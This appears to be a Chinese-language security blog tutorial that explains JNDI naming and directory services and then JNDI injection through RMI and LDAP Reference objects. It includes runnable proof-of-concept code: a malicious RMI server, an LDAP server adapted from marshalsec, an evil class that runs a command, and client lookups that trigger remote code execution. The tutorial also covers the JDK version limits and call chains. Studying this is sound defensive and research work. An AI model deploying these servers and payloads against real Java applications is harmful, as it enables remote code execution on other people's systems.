## JNDI基础

`JNDI(Java Naming and Directory Interface)`是Java提供的`Java 命名和目录接口`。通过调用`JNDI`的`API`应用程序可以定位资源和其他程序对象。`JNDI`是`Java EE`的重要部分，需要注意的是它并不只是包含了`DataSource(JDBC 数据源)`，`JNDI`可访问的现有的目录及服务有:`JDBC`、`LDAP`、`RMI`、`DNS`、`NIS`、`CORBA`。

**Naming Service 命名服务：**

命名服务将名称和对象进行关联，提供通过名称找到对象的操作，例如：DNS系统将计算机名和IP地址进行关联、文件系统将文件名和文件句柄进行关联等等。

**Directory Service 目录服务：**

目录服务是命名服务的扩展，除了提供名称和对象的关联，**还允许对象具有属性**。目录服务中的对象称之为目录对象。目录服务提供创建、添加、删除目录对象以及修改目录对象属性等操作。

**Reference 引用：**

在一些命名服务系统中，系统并不是直接将对象存储在系统中，而是保持对象的引用。引用包含了如何访问实际对象的信息。

### JNDI操作步骤

使用JNDI来访问命名服务或者目录服务，操作步骤如下：

    建立一个散列表（hashtable），它包含定义所希望使用的JNDI服务的属性，所希望连接的LDAP服务器IP地址以及工作的端口。
    将与认证成为用户登录有关的任何信息添加到散列表中，也就是注册环境变量。
    创建初始context对象。如果访问命名服务，则使用InitialContext类，如果访问目录服务，则要使用InitialDirContext类。
    使用刚才得到的context对象执行所需的操作（如添加新的条目或者搜索条目）。
    完成操作后关闭context对象。

## 目录服务——RMI远程方法调用

`RMI`的服务处理工厂类是:`com.sun.jndi.rmi.registry.RegistryContextFactory`，在调用远程的`RMI`方法之前需要先启动`RMI`服务，启动完成后就可以使用`JNDI`连接并调用了。

工厂方法即Factory Method，是一种对象创建型模式。工厂方法的目的是使得创建对象和使用对象是分离的，并且客户端总是引用抽象工厂和抽象产品：

![image-20220312203255736](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220312203255736.png)

```java
package JNDI;

import rmi.RMIInterface;

import javax.naming.Context;
import javax.naming.NamingException;
import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;
import java.rmi.RemoteException;
import java.util.Hashtable;


public class RMIRegistryContextFactoryTest {

    public static void main(String[] args) {
        String providerURL = "rmi://127.0.0.1:1099";
        // 创建环境变量对象
        Hashtable env = new Hashtable();
        // 设置JNDI初始化工厂类名
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        // 设置JNDI提供服务的URL地址
        env.put(Context.PROVIDER_URL, providerURL);
        // 通过JNDI调用远程RMI方法测试
        try {
            // 创建JNDI目录服务对象
            DirContext context = new InitialDirContext(env);
            // 通过命名服务查找远程RMI绑定的RMIInterface对象
            RMIInterface testInterface = (RMIInterface) context.lookup("hello");
            // 调用远程的RMIInterface接口的hello方法
            String result = testInterface.hello("snakin");
            System.out.println(result);
        } catch (NamingException | RemoteException e) {
            e.printStackTrace();
        }
    }

}
```

![image-20220312184321182](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220312184321182.png)

## 目录服务——DNS解析

`JNDI`支持访问`DNS`服务，注册环境变量时设置`JNDI`服务处理的工厂类为`com.sun.jndi.dns.DnsContextFactory`即可。

```java
package JNDI;

import javax.naming.Context;
import javax.naming.NamingException;
import javax.naming.directory.Attributes;
import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;
import java.util.Hashtable;

public class DNSContextFactoryTest {

    public static void main(String[] args) {
        // 创建环境变量对象
        Hashtable env = new Hashtable();
        // 设置JNDI初始化工厂类名
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.dns.DnsContextFactory");
        // 设置JNDI提供服务的URL地址，这里可以设置解析的DNS服务器地址
        env.put(Context.PROVIDER_URL, "dns://8.8.8.8/");
        try {
            // 创建JNDI目录服务对象
            DirContext context = new InitialDirContext(env);
            // 获取DNS解析记录测试
            Attributes attrs = context.getAttributes("snakin.top", new String[]{"A"});
            System.out.println(attrs);

        } catch (NamingException e) {
            e.printStackTrace();
        }
    }

}
```

![image-20220312220209165](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220312220209165.png)

## Reference类

Reference类表示对存在于命名/目录系统以外的对象的引用。

Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。

在使用Reference时，我们可以直接将对象写在构造方法中，当被调用时，对象的方法就会被触发。

几个比较关键的属性：

- className：远程加载时所使用的类名；
- classFactory：加载的class中需要实例化类的名称；
- classFactoryLocation：远程加载类的地址，提供classes数据的地址可以是file/ftp/http等协议；

## JNDI注入

### 前提条件&JDK防御

要想成功利用JNDI注入漏洞，重要的前提就是当前Java环境的JDK版本，而JNDI注入中不同的攻击向量和利用方式所被限制的版本号都有点不一样。

这里将所有不同版本JDK的防御都列出来：

- JDK  6u45、7u21之后：java.rmi.server.useCodebaseOnly的默认值被设置为true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前JVM的java.rmi.server.codebase指定路径加载类文件。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。
- JDK  6u141、7u131、8u121之后：增加了com.sun.jndi.rmi.object.trustURLCodebase选项，默认为false，禁止RMI和CORBA协议使用远程codebase的选项，因此RMI和CORBA在以上的JDK版本上已经无法触发该漏洞，但依然可以通过指定URI为LDAP协议来进行JNDI注入攻击。
- JDK 6u211、7u201、8u191之后：增加了com.sun.jndi.ldap.object.trustURLCodebase选项，默认为false，禁止LDAP协议使用远程codebase的选项，把LDAP协议的攻击途径也给禁了。

因此，我们在进行JNDI注入之前，必须知道当前环境JDK版本这一前提条件，只有JDK版本在可利用的范围内才满足我们进行JNDI注入的前提条件。

![在这里插入图片描述](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/c5e696156ca24b36be7527407f076b61.png)

### 1 RMI恶意远程对象

codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。

RMI客户端在 lookup()  的过程中，会先尝试在本地CLASSPATH中去获取对应的Stub类的定义，并从本地加载，然而如果在本地无法找到，RMI客户端则会向远程Codebase去获取攻击者指定的恶意对象，这种方式将会受到 useCodebaseOnly 的限制。利用条件如下：

1. RMI客户端的上下文环境允许访问远程Codebase。
2. 属性 java.rmi.server.useCodebaseOnly 的值必需为false。

如果我们指定 `codebase=http://example.com/` ，然后加载 org.vulhub.example.Example 类，则

Java虚拟机会下载这个文件` http://example.com/org/vulhub/example/Example.class `，并作为

Example类的字节码。

只要控制Server端的codebase（修改Client端的codebase地址），就能给Client完成注入。
**注入步骤**

- 攻击者将恶意Remote对象绑定到Server端的Registry
- Remote类放在服务器上，然后设置Server端的codebase地址（java.rmi.server.codebase属性）
- Client在lookup时找不到该类就会向远程codebase加载恶意Remote对象

**限制**

从JDK 6u45、7u21开始，`java.rmi.server.useCodebaseOnly `的默认值就是true。在

`java.rmi.server.useCodebaseOnly `配置为 true 的情况下，Java虚拟机将只信任预先配置好的

codebase ，不再支持从RMI请求中获取。使用这个属性来防止客户端VM从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。

这种方法用途不是很广。

### 2 RMI + Reference

通过RMI进行JNDI注入，攻击者构造的恶意RMI服务器向客户端返回一个`Reference`对象，`Reference`对象中指定从远程加载构造的恶意`Factory`类，客户端在进行`lookup`的时候，会从远程动态加载攻击者构造的恶意`Factory`类并实例化，攻击者可以在构造方法或者是静态代码等地方加入恶意代码。

因为`Reference`没有实现`Remote`接口也没有继承`UnicastRemoteObject`类，故不能作为远程对象bind到注册中心，所以需要使用`ReferenceWrapper`对`Reference`的实例进行一个封装。

看一下示例代码：

服务端

```java
package JNDI;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;


public class rmiserver {

    public static void main(String[] args) throws Exception{
        Registry registry= LocateRegistry.createRegistry(1099);

        Reference reference = new Reference("evil", "evil", "http://localhost/");
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.bind("calc", wrapper);

    }
}
```

恶意代码（`evil.class`）

```java
import java.io.IOException;

public class evil {
    public evil() throws IOException {
        Runtime.getRuntime().exec("calc");
    }
}
```

Client端，lookup触发RCE

```java
import javax.naming.InitialContext;

public class JNDI_Test {
    public static void main(String[] args) throws Exception{
        new InitialContext().lookup("rmi://127.0.0.1:1099/calc");
    }
}
```

![image-20220508014732306](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220508014732306.png)

#### 限制

JDK 6u132, JDK 7u122, JDK 8u113 中Java提升了JNDI 限制了Naming/Directory服务中JNDI Reference远程加载Object Factory类的特性。系统属性 `com.sun.jndi.rmi.object.trustURLCodebase`、`com.sun.jndi.cosnaming.object.trustURLCodebase` 的默认值变为false

- 客户端`com.sun.jndi.rmi.object.trustURLCodebase`设置为true

#### 调用链

```
getObjectFactoryFromReference:163, NamingManager (javax.naming.spi)
getObjectInstance:319, NamingManager (javax.naming.spi)
decodeObject:456, RegistryContext (com.sun.jndi.rmi.registry)
lookup:120, RegistryContext (com.sun.jndi.rmi.registry)
lookup:203, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:411, InitialContext (javax.naming)
main:7, JNDI_Test (JNDI)
```

简单看一下关键部分，跟进`com.sun.jndi.rmi.registry.RegistryContext#decodeObject`，这里是将从服务端返回的`ReferenceWrapper_Stub`获取`Reference`对象。

```java
 private Object decodeObject(Remote var1, Name var2) throws NamingException {
        try {
            Object var3 = var1 instanceof RemoteReference ? ((RemoteReference)var1).getReference() : var1;
            return NamingManager.getObjectInstance(var3, var2, this, this.environment);
        } catch (NamingException var5) {
            throw var5;
        } catch (RemoteException var6) {
            throw (NamingException)wrapRemoteException(var6).fillInStackTrace();
        } catch (Exception var7) {
            NamingException var4 = new NamingException();
            var4.setRootCause(var7);
            throw var4;
        }
    }
}
```

`decodeObject` 函数的内容非常关键，首先会判断我们的 var1 是否是 RemoteReference 的子类，如果是的话就会利用 `getReference()` 来获取其 `Reference` 类 ，然后赋值给var3

此时的var3是`Reference`类，随后进入`getObjectInstance`方法，这里继续跟进

![image-20220516132152213](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220516132152213.png)



跟进`javax.naming.spi.NamingManager#getObjectFactoryFromReference`

此处`clas = helper.loadClass(factoryName);`尝试从本地加载`Factory`类，如果不存在本地不存在此类，则会从`codebase`中加载。

`clas = helper.loadClass(factoryName, codebase);`会从远程加载我们恶意class，然后`return (clas != null) ? (ObjectFactory) clas.newInstance() : null;`对我们的恶意类进行一个实例化，进而加载我们的恶意代码。

```java
static ObjectFactory getObjectFactoryFromReference(
        Reference ref, String factoryName)
        throws IllegalAccessException,
        InstantiationException,
        MalformedURLException {
        Class clas = null;

        // Try to use current class loader
        try {
             clas = helper.loadClass(factoryName);
        } catch (ClassNotFoundException e) {
            // ignore and continue
            // e.printStackTrace();
        }
        // All other exceptions are passed up.

        // Not in class path; try to use codebase
        String codebase;
        if (clas == null &&
                (codebase = ref.getFactoryClassLocation()) != null) {
            try {
                clas = helper.loadClass(factoryName, codebase);
            } catch (ClassNotFoundException e) {
            }
        }

        return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
    }

```

`com.sun.naming.internal.VersionHelper12#loadClass`具体代码如下，可以看到他是通过`URLClassLoader`从远程动态加载我们的恶意类。

```java
public Class loadClass(String className, String codebase)
        throws ClassNotFoundException, MalformedURLException {

        ClassLoader parent = getContextClassLoader();
        ClassLoader cl =
                 URLClassLoader.newInstance(getUrlArray(codebase), parent);

        return loadClass(className, cl);
    }
```

最终进行实例化，进而触发了我们静态代码片段中的恶意代码，从而弹出计算器。

梳理一下流程：

1. 首先 RMI 获取了我们 HTTP 服务器上的远程对象引用，利用 ReferenceWrapper 包装之后绑定在了 Registry 上
2. JNDI 客户端根据名字获取到了 RMI 上的引用
3. 获取到之后首先利用 getObjectFactoryFromReference 方法对 ReferenceWrapper_Stub 进行了还原 获取到了 Reference 类
4. 然后根据 Reference类中的codebase url 远程获取了我们的恶意类并且进行了实例化从而在客户端触发了恶意代码

所以我们在符合 jdk 版本要求的情况下，控制jndi请求的路径，即可进行命令执行，fastjson就是以这个原理触发的。



### 3 LDAP+Reference

`LDAP`，全称`Lightweight Directory Access Protocol`，即轻量级目录访问协议。

除了RMI服务之外，JNDI还可以对接LDAP服务，且LDAP也能返回JNDI Reference对象，利用过程与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址如`ldap://xxx/xxx`，由攻击者控制的LDAP服务端返回一个恶意的JNDI Reference对象。

LDAP+Reference的技巧远程加载Factory类不受RMI+Reference中的`com.sun.jndi.rmi.object.trustURLCodebase`、`com.sun.jndi.cosnaming.object.trustURLCodebase`等属性的限制，所以适用范围更广。但在JDK  8u191、7u201、6u211之后，`com.sun.jndi.ldap.object.trustURLCodebase`属性的默认值被设置为false，对LDAP Reference远程工厂类的加载增加了限制。

所以，当JDK版本介于8u191、7u201、6u211与6u141、7u131、8u121之间时，我们就可以利用LDAP+Reference的技巧来进行JNDI注入的利用。

#### JDK<8u191

起一个LDAP服务，代码改自`marshalsec`

```java
package JNDI;

import java.net.InetAddress;
import java.net.MalformedURLException;
import java.net.URL;

import javax.net.ServerSocketFactory;
import javax.net.SocketFactory;
import javax.net.ssl.SSLSocketFactory;

import com.unboundid.ldap.listener.InMemoryDirectoryServer;
import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;
import com.unboundid.ldap.listener.InMemoryListenerConfig;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPException;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;

public class LDAPserver {

    private static final String LDAP_BASE = "dc=example,dc=com";

    public static void main ( String[] tmp_args ) {
        String[] args=new String[]{"http://localhost:9999/#evil3"};
        int port = 7777;

        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen", //$NON-NLS-1$
                    InetAddress.getByName("0.0.0.0"), //$NON-NLS-1$
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(args[ 0 ])));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port); //$NON-NLS-1$
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;

        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }

        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }
        }

        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "foo");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference"); //$NON-NLS-1$
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }
    }
}
```

客户端

```java
package JNDI;

import javax.naming.InitialContext;

public class JNDI_Test {
    public static void main(String[] args) throws Exception{
        Object object=new InitialContext().lookup("ldap://127.0.0.1:7777/calc");
    }
}
```

![image-20220516190744143](https://cosmoslin.oss-cn-chengdu.aliyuncs.com/img2/image-20220516190744143.png)



#### 调用链

```
getObjectFactoryFromReference:146, NamingManager (javax.naming.spi)
getObjectInstance:188, DirectoryManager (javax.naming.spi)
c_lookup:1086, LdapCtx (com.sun.jndi.ldap)
p_lookup:544, ComponentContext (com.sun.jndi.toolkit.ctx)
lookup:177, PartialCompositeContext (com.sun.jndi.toolkit.ctx)
lookup:203, GenericURLContext (com.sun.jndi.toolkit.url)
lookup:94, ldapURLContext (com.sun.jndi.url.ldap)
lookup:411, InitialContext (javax.naming)
main:7, JNDI_Test (JNDI)
```

其核心还是通过`Reference`加载远程的`Factory`类，最终调用也是RMI一样`javax.naming.spi.NamingManager#getObjectFactoryFromReference`







参考：

https://blog.csdn.net/Xxy605/article/details/122128247

https://www.redteaming.top/2020/08/24/JNDI-Injection/#Reference

https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/#LDAP%E6%94%BB%E5%87%BB%E5%90%91%E9%87%8F
